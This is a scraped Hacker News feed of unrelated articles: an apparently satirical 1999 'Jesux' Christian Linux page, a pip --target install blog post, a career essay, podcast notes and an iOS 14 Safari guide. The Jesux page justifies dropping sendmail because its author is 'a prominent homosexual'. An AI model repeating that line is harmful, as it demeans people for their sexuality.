<h3>What is different about Jesux?</h3>

<p>
Below is a short list.  As we get more information, we will put it here.  Send more suggestions to <a href="mailto:jesux@pobox.com">jesux@pobox.com</a>.  Send your suggestions for content in the bookmark, fortune, and .newsrc files, too, and we will start posting some of this stuff.
</p>

<ul>
    <li>default fortune file contains quotes from the scriptures, Augustine, C.S. Lewis, Chuck Swindoll, etc.</li>
    <li>Christian Enlightenment themes featuring Jesus, the cross, and other Christian icons</li>
    <li>Login screen has full text to Lord's Prayer and Pledge of Allegiance, with Christian and American symbols
    <ul>
        <li>Provide alternate screens for non-Americans, perhaps</li>
    </ul>
    </li>
    <li>Pregenerated Netscape bookmarks and .newsrc files pointing to prescreened Christian web sites and newsgroups</li>
    <li>cal(1) includes Christian holidays</li>
    <li>Special hack of emacs "M-x doctor" mode, "M-x pastor"</li>
    <li>Optional technical support and basic counseling services provided by Christian hackers
        <ul>
            <li>The current plan is to double up the tech support line as a crisis line, where people in need can be redirected to people who can really help them</li>
        </ul>
    </li>
    <li>Online Bible in King James Version
        <ul>
            <li>no other versions will be provided by default; we feel the KJV is the only English version that can be fully trusted</li>
        </ul>
    </li>
    <li>Addition of <a href="http://pudge.net/jesux/kjv.words.gz">/usr/dict/kjv.words</a> (exhaustive)</li>
    <li>Removal of some of the RedHat games
        <ul>
            <li>we don't play them much, but several of you have noted that some of them are clearly inappropriate</li>
        </ul>
    </li>
    <li>Squid proxy server (plus squidGuard) bundled and configured for blocking illicit web sites (including a regularly updated list of illicit sites and URL patterns to install on your own; we will be looking for mature and diligent volunteers to help maintain it)</li>
    <li>Optionally disable logins on Sunday, the day of rest</li>
    <li>bash(1) is default
        <ul>
            <li>the "Bourne-Again" shell is already the default; but we like the shell, and we love the name :)</li>
        </ul>
    </li>
    <li>chmod(1) accepts hexadecimal modes, such as 0x01B6</li>
    <li>qmail replaces sendmail as the standard MTA (sendmail was written by a prominent homosexual)
    <!-- Happy Birthday, Funny Little Man!  sweeeet.  -->
        <ul>
            <li>we are considering postfix too, due to popular request</li>
        </ul>
    </li>
    <li>Hierarchical user structure, so parents and teachers can easily access children's files without needing to become root</li>
    <li>No encryption provided; Christians have nothing to hide
        <ul>
            <li>We have had concerns about the "no encryption" item ... but no worries, crypt(3) will still be there.  Sorry for the confusion, we do not generally consider it as encryption, though, of course, technically it is.  But since it is generally unsuitable for anything other than password authentication, we don't see any problem with it.</li>
        </ul>
    </li>
    <li>No cracking utilities provided; SAINT can be acquired from us later, after the user has proven his worth</li>
</ul>

<p>
All new code will be provided under the <a href="http://pudge.net/jesux/cspl.html">Christian Software Public License</a>, an Open Source-compatible license.  Go ahead and <a href="http://pudge.net/jesux/cspl.html">check it out</a>.  The final CSPL is very similar to the BSD license, where the required advertising is the text of John 3:16 from the King James Version of the Bible.  <em>(Note: the requested requirement that only Christians could redistribute the code was considered and rejected, in accordance with the "No Discrimination Against Persons or Groups" section of the Open Source Definition.  We actually agree with this section of the OSD ... the more people that use our software, the more that see the Gospel; the more that distribute it, the more that advertise His word in His name!)</em>
</p>

<p>
Also, we are seriously considering changing some fundamental OS features.  The idea would be that function calls and features suggesting evil and otherwise pagan ideas would be changed.
</p>

<ul>
    <li>abort(3)</li>
    <li>kill(1)</li>
    <li>references to "daemon"</li>        
</ul>

<p>
NOTE: we do <strong>not</strong> believe words are inherently bad.  We simply do not like these words because of their connotations in different contexts.  You do not have to agree, but you will not change our minds.  However, because this is not a point of religious contention but of linguistics and meanings and associations, and because the solution seems like the easiest one to implement, the current plan is to provide symlinks, headers, macros, etc. so that the existing names will still exist, but those who want to use alternate symbols (words) can do so.
</p>

<p>
In the interest of getting out a functional system, these will all wait for some future release anyway.
</p>


<h3>When will it be out?</h3>

<p>
Jesux will be here in late December (hopefully before Jesus arrives :).  Contact <a href="mailto:jesux@pobox.com">jesux@pobox.com</a> for more information.  Ask to be put on our announcement list.
</p>


<h3>Latest News</h3>

<p>
We have been asked several times about "corporate information."  We are not a company, and will not be.  We are volunteers doing this in our free time, and seek not a dime of profit, not a penny of contribution or charity.  We have all been involved in open source projects for a few years, and this one is no different in that respect.  It is different in that it is closer to our hearts and can possibly make a real difference in people's lives.
</p>

<p>
We have been getting lots of requests about whether or not this site is a hoax.  We understand the reasons why, but it saddens us.  What has become of our society that it is so hard to believe that people are earnestly seeking to do good in God's name, to follow Him, and to help others through the power of the Holy Spirit?  Please do keep the mail coming, but don't bother asking us if this is a hoax.  We are here to do what we think is good and right.  We don't have time to answer such frivolous mail anymore.  Please keep all your other messages coming, though!  We still don't have time to answer all of them, but we answer what we can, and we will add you to our announcement list if you request it.  Thank you!
</p>

<p>
<strong>Apologies</strong>:  We rightfully criticized slashdot.org previously, but we did not do so with a loving spirit.  For that, we apologize.  We still will not bow to the media, we do not need the media, and we will succeed in providing a distribution for you.  If God is for us, who can be against us?
</p>

<p>
We are considering making the first distribution of Jesux as a set of patches over the most recent RedHat distribution.  This will make "time-to-market" quicker, and make distribution easier, too.  Many of you have requested that we post what we have, so people can start using it, and participating in the development.  We are planning on it!  Be patient; good things come to those who wait.  :)
</p>

<p>
We are getting great feedback (even from some of you who don't like us, or what we are doing).  Keep it coming!
</p>

<hr>

<p>
<em>Finally, brethren, whatsoever things are true, whatsoever things are honest, whatsoever things are just, whatsoever things are pure, whatsoever things are lovely, whatsoever things are of good report; if there be any virtue, and if there be any praise, think on these things.  (Phillipians 4:8)</em>  As such, this site is conformant to HTML 4.0 strict and CSS1.
</p>

<p>
This page last updated Wednesday, September 29, 1999, 13:51:07 PDT
</p>




<img src="http://geo.yahoo.com/serv?s=76001067&amp;t=1240529179&amp;f=us-w3" alt="1" width="1" height="1">
</div>]]>
            </description>
            <link>http://pudge.net/jesux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503591</guid>
            <pubDate>Thu, 17 Sep 2020 12:07:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I think I want to drop modern Python packages into a single program]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24503292">thread link</a>) | @pcr910303
<br/>
September 17, 2020 | https://utcc.utoronto.ca/~cks/space/blog/python/PipDropInInstall | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/python/PipDropInInstall">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>How I think I want to drop modern Python packages into a single program</h2>

	<p><small>September 16, 2020</small></p>
</div><div><p>For reasons beyond the scope of this blog entry, I'm considering
augmenting <a href="https://github.com/siebenmann/exim-attachment-logger">our Python program to log email attachment information
for Exim</a> to
use <a href="https://github.com/decalage2/oletools">oletools</a> to peer
inside MS Office files for indications of bad things. Oletools is
not packaged by Ubuntu as far as I can see, and in any case it would
be an older version, so we would need to add the oletools Python
packages ourselves.</p>

<p>The official oletools install instructions talk about using either
pip or setup.py. As a general rule, we're very strongly against
installing anything system-wide except through Ubuntu's own package
management system, and the environment our Python program runs in
doesn't really have a home directory to use pip's --user option, so
the obvious and simple pip invocations are out. I've used a setup.py
approach to install a large Python package into a specific directory
hierarchy in the past (Django), and it was a big pain, so I'd like
not to do it again.</p>

<p>(Nor do we want to learn about how to build and maintain Python
virtual environments, and then convert how we run this Python program
to use one.)</p>

<p>After some looking at pip's help output I found the '<code>pip install
--target &lt;directory&gt;</code>' option and tested it a bit. This appears to
do more or less what I want, in that it installs oletools and all
of its dependencies into the target directory. The target directory
is also littered with various metadata, so we probably don't want
to make it where the program's normal source code lives. This means
we'll need to arrange to run the program so that <code>$PYTHONPATH</code> is
set to the target directory, but that's a solvable problem.</p>

<p>(This '<code>pip install</code>' invocation does write some additional pip
metadata to your <code>$HOME</code>. Fortunately it actually does respect the
value of the <code>$HOME</code> environment variable, so I can point that at
a junk directory and then delete it afterward. Or I can make <code>$HOME</code>
point to my target directory so everything is in one place.)</p>

<p>All of this is not quite as neat and simple as dropping an <code>oletools</code>
directory tree in the program's directory, <a href="https://utcc.utoronto.ca/~cks/space/blog/python/UpdatingToRarfile30">in the way that I could
deal with needing the rarfile module</a>, but then
again oletools has a bunch of dependencies and pip handles them all
for me. I could manually copy them all into place, but that would
actually create a sufficiently cluttered program directory that I
prefer a separate directory even if it needs a <code>$PYTHONPATH</code> step.</p>

<p>(Some people will say that setting <code>$PYTHONPATH</code> means that I should
go all the way to a virtual environment, but that would be a lot
more to learn and it would be more opaque. But looking into this
a bit did lead to me learning that <a href="https://docs.python.org/3/tutorial/venv.html">Python 3 now has standard
support for virtual environments</a>.)</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/python/PipDropInInstall</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503292</guid>
            <pubDate>Thu, 17 Sep 2020 11:24:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Toward a Technological Cage for the Masses]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 75 (<a href="https://news.ycombinator.com/item?id=24503179">thread link</a>) | @sT370ma2
<br/>
September 17, 2020 | https://cheapskatesguide.org/articles/techno-cage.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/techno-cage.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/techno-cage.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503179</guid>
            <pubDate>Thu, 17 Sep 2020 11:05:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[To All the Jobs I Had Before]]>
            </title>
            <description>
<![CDATA[
Score 304 | Comments 80 (<a href="https://news.ycombinator.com/item?id=24502983">thread link</a>) | @ingve
<br/>
September 17, 2020 | https://elisabethirgens.github.io/notes/2020/09/to-all-jobs-i-had-before/ | <a href="https://web.archive.org/web/*/https://elisabethirgens.github.io/notes/2020/09/to-all-jobs-i-had-before/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>My career as a developer started 5 years ago. Before that I have 15 years work experience from other roles, and I‘ve been thinking about <strong>what I learnt</strong> from all those jobs I had before.</p>

<hr>

<h3 id="questioning-predefined-tasks-">Questioning predefined tasks 🤔</h3>

<p><strong>ELDERLY CARE</strong> was my first full time job, providing care services for senior citizens in their homes. The shift started with receiving a work list printed on paper. These were public services that had been granted based on certain requirements, so it was pretty much an official work list. But…</p>

<p>I learnt that the details could be outdated, misunderstood, or sometimes just not the most important task to prioritize that day. I became critical of instructions written by people who where not there, and tried to understand individual needs instead. Also: an entire year of hard core training in empathy.</p>

<hr>

<h3 id="systems-thinking-️">Systems thinking ♻️</h3>

<p><strong>THE FISH FACTORY</strong> processed 300 t pelagic fish daily, with intake from the boat dependent on work done in sequence by 50 people. Most packing 20kg boxes, some driving a <a href="https://elisabethirgens.github.io/notes/2017/11/fish/">fork lift truck or operating a fillet machine</a>. The elevator moved pallets frozen the previous day, and it was such a critical bottle neck that one person was assigned elevator duty to avoid prolonged stops.</p>

<p>I learnt how constraints affect the system as a whole. If the elevator or any other part of the system was too slow, the entire production would grind to a halt. You truly grasp the concept of <strong>work flow</strong> when it is physical. Boxes clogging the conveyor belts, pallets queueing up with no floor space, lines of people literally just having to wait because their work stations are blocked from progress.</p>

<hr>

<h3 id="influencing-decisions-">Influencing decisions 💥</h3>

<p><strong>UNIONS</strong> are valuable and I was a pissed-off 21 year old elected representative, capable of reading and utilizing the labour laws better than company management. Fun times. Buy me a beer and I&nbsp;can tell you the story of when I intentionally got myself fired to dispute illegal work contracts.</p>

<p>I learnt that organisations consist of people and decisions do not materialize out of thin air. You can often impact more than you think, even if you feel like you have no say at all. Companies can have the most rigid power structures in place, and it is still possible to push, prod, nudge, plant ideas.</p>

<hr>

<h3 id="computers-are-not-magic-">Computers are not magic 💻</h3>

<p><strong>OIL INDUSTRY PROCUREMENT</strong> stood for a handful of temp office jobs over the years. I quickly picked up how to use Office programs and found my way around ERP systems, which landed me these gigs as a person who could use whatever software without the courses upfront.</p>

<p>I learnt that I am apparently “good with computers”.</p>

<hr>

<h3 id="improving-daily-work-">Improving daily work 🛠</h3>

<p><strong>THE BOAT ENGINE FACTORY</strong> provided steady work all year round, unlike the fish factory. Workers were still typically considered interchangeable units, especially in the warehouse functions, but there was variety and autonomy — which meant we excelled in creating routines and optimization hacks.</p>

<p>I learnt how being lazy is a fantastic trait that motivates improvements. Faster, so we could have longer coffee breaks. Easier, so we could think about other things than the tedious. More resilient, because getting packages in return with missing or broken spare parts was boring repeat work.</p>

<hr>

<h3 id="limitations-are-my-jam-">Limitations are my jam ⏳</h3>

<p><strong>DESIGN AGENCY</strong> for 4 years, everything from print to HTML/CSS for static sites. A lot of designers enjoy working in a limitless realm for as long as possible, before they are forced to reign it in. They tried to teach this approach to creativity when I studied graphic design, but I revel in the realistic.</p>

<p>I learnt to prefer discovering the limits early, then proceeding to be creative within those. I&nbsp;don’t get thrilled about what we could <em>potentially</em> do with unlimited time and twice the number of people. I&nbsp;genuinely get most excited by what we can do here and now with the resources we have.</p>

<hr>

<h3 id="effectively-involving-stakeholders-">Effectively involving stakeholders 💬</h3>

<p><strong>RUNNING A BUSINESS</strong> as a freelance frontender for 7 years. When building custom websites at fixed project prices, it was essential to know exactly how to keep clients in the loop. Working in solitude, attempting to solve all the problems before a big reveal, would have been a terrible approach.</p>

<p>I learnt the value of showing work in progress. I got the hang of asking the right questions, and setting up a process that allowed me to get direction along the way. To this day, I don’t try to impress with my suggestions — instead I bring others along and utilize transparency while work in iterations.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://elisabethirgens.github.io/notes/2020/09/to-all-jobs-i-had-before/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502983</guid>
            <pubDate>Thu, 17 Sep 2020 10:37:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Become an Ultralearner – Scott H. Young on the Artists of Data Science Podcast]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24502962">thread link</a>) | @harpreetsahota
<br/>
September 17, 2020 | https://theartistsofdatascience.fireside.fm/scott-h-young | <a href="https://web.archive.org/web/*/https://theartistsofdatascience.fireside.fm/scott-h-young">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    <p>Scott H Young a writer, programmer, traveler and avid reader of interesting things. For the last ten years he's been experimenting to find out how to learn and think better. Today he swings by the show and talks to us about how we can master hard skills faster!</p>

<p><strong>QUOTES</strong><br>
"What you need is not just motivation, but you need some kind of system. You need some way to channel that initial burst of enthusiasm into creating structures for your life so that you will kind of consistently re-engage with it and consistently do what you need to do to learn things better." [00:07:37] </p>

<p>"The way that mental models become useful is when you really spent a lot of time thinking about them, not when you just heard their name and kind of written them down and understood a few sentences." [00:13:54] </p>

<p>"There is a certain type of person, I guess you could say that like they do need to stop reading, they need to actually start just taking action on things and implementing things." [00:24:23] </p>

<p>"The possibilities of learning are a lot more vast than you've maybe previously considered." [01:02:17]</p>

<p><strong>CONNECT WITH SCOTT</strong><br>
Website: <a href="https://www.scotthyoung.com/" rel="nofollow">https://www.scotthyoung.com/</a></p>

<p>Twitter: <a href="https://twitter.com/scotthyoung/" rel="nofollow">https://twitter.com/scotthyoung/</a></p>

<p>Facebook: <a href="https://www.facebook.com/AuthorScottYoung/" rel="nofollow">https://www.facebook.com/AuthorScottYoung/</a></p>

<p><strong>SHOW NOTES</strong></p>

<p>[00:01:27] Introduction for our guest</p>

<p>[00:02:42] Talk to us a bit about your journey. How did you get to where you are today?</p>

<p>[00:03:30] The struggles on the path to becoming an ultralearner</p>

<p>[00:06:22] The pitfalls of motivation</p>

<p>[00:08:25] A walk down the narrow path to success</p>

<p>[00:10:47] How to make sure you’re applying effort intelligently</p>

<p>[00:13:18] The benefits and limits of mental models</p>

<p>[00:16:32] The difference between knowing the name of a thing and knowing the thing</p>

<p>[00:18:54] Scott’s favorite mental model</p>

<p>[00:21:05] Scott talks about his doodles</p>

<p>[00:23:33] Is reading making you stupid?</p>

<p>[00:26:23] The danger of learning theories and not applying them</p>

<p>[00:27:37] You need to do more than just homework</p>

<p>[00:29:27] What to do when you’re stunned into inaction</p>

<p>[00:31:39] You can’t see your brain getting buff</p>

<p>[00:33:36] Luck to destiny</p>

<p>[00:39:14] What exactly is ultralearning?</p>

<p>[00:40:27] How can we use ultralearning to accelerate, transition, or rescue our careers?</p>

<p>[00:41:46] Why is it that we procrastinate?</p>

<p>[00:42:55] Mental habits to combat procrastination</p>

<p>[00:45:40] You’re more ready than you think you are</p>

<p>[00:49:32] How can we mitigate the distraction of our mind?</p>

<p>[00:51:18] Do you have any tips for our listeners for what they could start doing today to improve the quality of their focus?</p>

<p>[00:53:27] The principle of intuition</p>

<p>[00:59:47] Building expert intuition</p>

<p>[01:02:04] What's the one thing you want people to learn from your story?</p>

<p>[01:03:25] The random round</p>




      
      
  </div></div>]]>
            </description>
            <link>https://theartistsofdatascience.fireside.fm/scott-h-young</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502962</guid>
            <pubDate>Thu, 17 Sep 2020 10:34:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sixty second stories of exceptional founders, sent out every 10 days]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24502932">thread link</a>) | @plincoln8
<br/>
September 17, 2020 | http://tareksway.com/visionaries | <a href="https://web.archive.org/web/*/http://tareksway.com/visionaries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://tareksway.com/visionaries</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502932</guid>
            <pubDate>Thu, 17 Sep 2020 10:28:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Safari on iOS 14 and iPadOS 14 for PWA and Web Developers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24502728">thread link</a>) | @Jarred
<br/>
September 17, 2020 | https://firt.dev/ios-14 | <a href="https://web.archive.org/web/*/https://firt.dev/ios-14">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <header>
          <p>What's new, what's missing, new challenges and new abilities</p><section id="meta">
              <p><time datetime="Invalid DateTime">Published 4 days ago (16 Sep 2020)      
            </time></p><p>About 21 min reading time
          </p></section>
      <section>
            
                  <a href="https://firt.dev/tags/ios/">#ios</a>
                  <a href="https://firt.dev/tags/webview/">#webview</a>
                  <a href="https://firt.dev/tags/pwa/">#pwa</a>
                  <a href="https://firt.dev/tags/store/">#store</a>
              
      </section>
      
          <p>From today, iOS 14 and iPadOS 14 are available to most users in the world. I've played with it, and here you have a list of the essential changes for PWA and Web Designers and Developers. As usual with Apple, some (most?) of this information was not documented at all.</p>
      </header><section>
        <nav>
        <ol><li><a href="#what's-new-in-a-nutshell">What's new in a nutshell</a></li><li><a href="#new-features-for-users">New Features for Users</a><ol><li><a href="#privacy-report">Privacy Report</a></li><li><a href="#website-translation">Website Translation</a></li><li><a href="#performance-improvements">Performance Improvements</a></li></ol></li><li><a href="#default-browser-change">Default Browser Change</a><ol><li><a href="#hello-service-worker">Hello Service Worker</a></li><li><a href="#what-changing-a-default-browser-means-and-what-it-doesn't-mean">What changing a default browser means and what it doesn't mean</a></li></ol></li><li><a href="#progressive-web-apps">Progressive Web Apps</a><ol><li><a href="#storage-shared-with-safari">Storage shared with Safari</a></li><li><a href="#app-library-for-pwas">App Library for PWAs</a></li><li><a href="#inspecting-pwas">Inspecting PWAs</a></li><li><a href="#bugs">Bugs</a></li><li><a href="#white-status-bar-gone">White Status Bar gone</a></li><li><a href="#web-app-manifest-support">Web App Manifest support</a></li></ol></li><li><a href="#new-abilities-and-apis">New Abilities and APIs</a><ol><li><a href="#http%2F3">HTTP/3</a></li><li><a href="#javascript-engine">JavaScript Engine</a></li><li><a href="#faceid-and-touchid-for-the-web">FaceID and TouchID for the Web</a></li><li><a href="#sms-one-time-codes">SMS One-time codes</a></li></ol></li><li><a href="#new-for-design-%26-media">New for Design &amp; Media</a></li><li><a href="#geolocation-changes">Geolocation Changes</a><ol><li><a href="#working-with-imprecise-location">Working with imprecise location</a></li><li><a href="#what-is-an-approximate-location-anyway%3F">What is an approximate location anyway?</a></li></ol></li><li><a href="#service-worker-changes">Service Worker Changes</a><ol><li><a href="#sharing-the-storage-2020-edition">Sharing the Storage 2020 edition</a></li></ol></li><li><a href="#ipados-new-features">iPadOS New Features</a><ol><li><a href="#multitasking">Multitasking</a></li><li><a href="#scribble-and-apple-pencil">Scribble and Apple Pencil</a></li><li><a href="#disabling-scribble-on-one-particular-element">Disabling Scribble on one particular element</a></li></ol></li><li><a href="#web-views-and-pwas-in-the-appstore">Web Views and PWAs in the AppStore</a><ol><li><a href="#itp">ITP</a></li><li><a href="#service-workers">Service Workers</a></li><li><a href="#app-bound-domains">App-Bound Domains</a></li></ol></li><li><a href="#security-bug">Security Bug</a></li><li><a href="#new-abilities-in-the-os">New Abilities in the OS</a><ol><li><a href="#news%2B-reading-web-links">News+ reading web links</a></li><li><a href="#app-clips">App Clips</a></li></ol></li><li><a href="#anything-else%3F">Anything else?</a></li></ol></nav>
      </section>
<p>This article marks ten years of writing about news on Safari for mobile (see the <a href="https://firt.dev/ios-4.2">first article on the series</a>). It's been a bumpy ride, detecting many new APIs and bugs, and asking questions the Safari doesn't want to respond. Of course, you may know about the <a href="https://firt.dev/lazy">bullying I've got from the team lately</a>. But here I am, keeping the story alive :).</p>
<blockquote>
<p>Many people asked me before how to support my work as I'm doing this as a freelancer. You can check one of my <a href="https://firt.dev/tags/course">courses</a>, use <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;hosted_button_id=97VA4JKZAKPLJ&amp;source=url">PayPal Donate</a>, or you can <a href="https://www.buymeacoffee.com/firt">Buy me a Coffee</a>. Thanks!</p>
</blockquote>
<h2 id="what's-new-in-a-nutshell">What's new in a nutshell <a href="#what's-new-in-a-nutshell">#</a></h2>
<p><em>New Safari features for users</em>: Page translation, Privacy Report, Performance Improvements<br>
<em>Default browser</em>: You can change the Default Browser App－Chrome or Edge now available, but there are some UX issues including reset choice on restart, and they are still not full browsers.<br>
<em>New Abilities and APIs</em>: Updated JS engine (BigInt, public class fields), HTTP/3 experiment, TouchID and FaceID for Web Authentication, SMS One Time codes supported.<br>
<em>New for Design &amp; Media</em>: WebP 🥳, HDR video, Picture in Picture for video playing, new Image Picker, some CSS additions<br>
<em>Geolocation</em>: Now Safari can expose the accurate or an approximate location based on the user's decision. Be aware of this!<br>
<em>Service Worker</em>: Safari and a PWA now share the registration and the cache storage, Chrome and Edge now support SWs as well as your web views if you follow some rules<br>
<em>Progressive Web Apps</em>: They don't appear in the new App Library, some bugs were solved, the white theme color is not supported anymore, and some limitations are still there. No better support for Web App Manifest or other PWA-related APIs<br>
<em>iPadOS</em>: Now PWAs can share the screen with other apps (including other PWAs), and with Apple Pencil, web apps can receive handwriting text over editable elements<br>
<em>WebViews and PWAs in AppStore:</em> Still no getUserMedia; a new feature to register safe domains that will give more power to a web view (such as Service Workers).<br>
<em>Security bug:</em> A significant security bug with Web Share is still there</p>
<h2 id="new-features-for-users">New Features for Users <a href="#new-features-for-users">#</a></h2>
<p>Safari users on iOS and iPadOS now have a couple of features that will impact how they browse our websites.</p>
<h3 id="privacy-report">Privacy Report <a href="#privacy-report">#</a></h3>
<p>The new privacy report is available in Safari (not in standalone PWAs). It will let the user know what ITP (Intelligent Tracking Prevention) has done to reduce tracking around the Web. The most visible enemy of this is Google Analytics, as it always appears as the most blocked target.</p>
<h3 id="website-translation">Website Translation <a href="#website-translation">#</a></h3>
<p>Safari now can translate a webpage into different pages (something that Chrome has supported for years). Unfortunately, I didn't find a way for a web owner to disable that feature as Chrome has with a meta tag.</p>
<h3 id="performance-improvements">Performance Improvements <a href="#performance-improvements">#</a></h3>
<p>According to <a href="https://developer.apple.com/documentation/safari-release-notes/safari-14-beta-release-notes">Safari Release Notes</a> (published in beta only for some reason), these are the new performance advantages for iOS and iPadOS are:</p>
<ul>
<li>Supported the incremental loading of PDF files.</li>
<li>Improved tab closing performance.</li>
<li>Improved IndexedDB performance.</li>
<li>Improved JavaScript cookie access performance.</li>
<li>Improved for-of performance.</li>
</ul>
<h2 id="default-browser-change">Default Browser Change <a href="#default-browser-change">#</a></h2>
<p>iOS 14 supports the <em>browser entitlement</em>, a right granted by Apple to apps that are web browsers as their primary goal (also known as "not Facebook"). This entitlement must be required from the browser team by email, and it will be granted if your App has web browsing as its primary purpose.</p>
<p>Right now, only the latest versions of Google Chrome and Microsoft Edge in the AppStore have granted access to it.</p>
<blockquote>
<p>Remember that Chrome, Firefox, Edge, or Brave from the App Store are not Chrome, Firefox, Edge, or Brave. They are just skins with UI behavior on top of WebKit's web view. The amount of things they can add or replace is limited. iOS 14 hasn't changed this situation.</p>
</blockquote>
<figure><img src="https://firt.imgix.net/img/notes/ios14/browser-change2.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/browser-change2.png?auto=format" width="1125" height="729"><figcaption>At this point, only Chrome and Edge have the browser entitlement to appear in this list</figcaption></figure>
<p>The place to change the default browser is a little odd, however. I was expecting one setting option in General. But instead, we have the setting screen available inside each browser. You will find the same settings within Safari settings, Edge settings, and Chrome settings; that panel will let you change it from a list.</p>
<figure><img src="https://firt.imgix.net/img/notes/ios14/edge.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/edge.png?auto=format" width="1125" height="2436"><figcaption>Microsoft Edge offers you to set itself as a default browser sending you to Settings</figcaption></figure>
<p>It's not even an action such as "Set this App as the default browser"; every browser will contain the full list of available browsers.</p>
<figure><img src="https://firt.imgix.net/img/notes/ios14/browser-chrome.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/browser-chrome.png?auto=format" width="1125" height="2436"><figcaption>From Settings &gt; Chrome you can access the default browser list</figcaption></figure>
<figure><img src="https://firt.imgix.net/img/notes/ios14/browser-safari.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/browser-safari.png?auto=format" width="1125" height="2436"><figcaption>From Settings &gt; Safari you can also access the default browser list</figcaption></figure>
<blockquote>
<p>There is a bug right now that will reset your choice of default Browser App every time your phone restarts. Also, the option to set the choice again dissapears from Safari when restarted. It needs to be re-defined on Edge or Chrome Settings.</p>
</blockquote>
<h3 id="hello-service-worker">Hello Service Worker <a href="#hello-service-worker">#</a></h3>
<p>Thanks to <a href="#app-bound-domains">App-Bound Domains</a>, browser apps with the browser entitlement will have app-bound domains enabled for the entire Web. That means that Service Workers are now available in Google Chrome and Microsoft Edge.</p>
<blockquote>
<p>Apple didn't document anywhere that App-bound domains will grant Service Workers to Web View. Still, the reality is that they are enabled.</p>
</blockquote>
<p>Have in mind:</p>
<ul>
<li>Service Worker registration and Cache Storage is unique to each browser. So if you browse the same web app in Safari, Chrome, and Edge, you will end up with three copies of the files. This situation is expectable, and the same happens on Android and desktop.</li>
<li>I'm not 100% sure about the storage limits and lifespan yet; my current estimation is that it won't follow the current WebKit 7-day limit but, who knows for sure 😐</li>
<li>Read more about this at the <a href="#service-workers-in-web-views">Service Workers in Web Views</a> section</li>
</ul>
<h3 id="what-changing-a-default-browser-means-and-what-it-doesn't-mean">What changing a default browser means and what it doesn't mean <a href="#what-changing-a-default-browser-means-and-what-it-doesn't-mean">#</a></h3>
<p>When you change the default browser, all <code>http</code> and <code>https</code> URLs that we use within the <code>openURL</code> native API will now be sent to that default browser instead of Safari. Clicking links on different apps is the most common example of this action.</p>
<p>We need to remember that browsers other than Safari on iOS and iPadOS are not full browsers. I used to call them pseudo browsers. They look like a browser, but it's just WebKit's web view (not even Safari) from a rendering engine perspective.</p>
<blockquote>
<p>It's not completely clear what happens with news URLs that seem to be captured by Apple News when the user has a subscription. <a href="#news%2B-reading-web-links">See more</a></p>
</blockquote>
<p>The main problems that pseudo browsers on iOS and iPad have today are:</p>
<ul>
<li><em>They can't use their web rendering and execution engines</em></li>
<li>They can't add icons (WebClips) to the home screen as Safari (therefore, <em>no PWA installation support</em> for alternative browsers)</li>
<li>They can't be used as a replacement of SafariViewController when other apps (such as Twitter) are creating an In-App browser; therefore, you will still use a forced Safari within apps (including session issues)</li>
<li>They are tied to WebKit APIs for the WebView; for example, WebRTC and getUserMedia are still not fully supported there (no raw camera access)</li>
<li>While they could add more API bridging with native, Most big players don't want to play on that field; it's never clear when Apple will approve that, as well as it might open some security risks</li>
<li>Now users can enable WebKit's Intelligent Tracking Prevention (ITP) on every WebView-based App, including browsers. The browser itself can't decide about that feature that may be enabled within its boundaries and affect how it renders content.</li>
</ul>
<h4 id="ux-inconsistencies">UX Inconsistencies <a href="#ux-inconsistencies">#</a></h4>
<p>There is no API for browsers to request being the default browser, or for other apps to query about the current browser. And the latter is leading to some UX inconsistencies. Let's see them.</p>
<figure><img src="https://firt.imgix.net/img/notes/ios14/browser-svc.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/browser-svc.png?auto=format" width="1125" height="2436"><figcaption>SafariViewController renders a Safari icon (bottom-right) that can now point to other browsers, such as Chrome. UI does not update to reflect that situation.</figcaption></figure>
<p>SafariViewController is the first victim of this issue. When you render a website in SafariViewController, such as when you click on a link within Twitter, the UI has a Safari icon that now may point to other browsers, such as Chrome.</p>
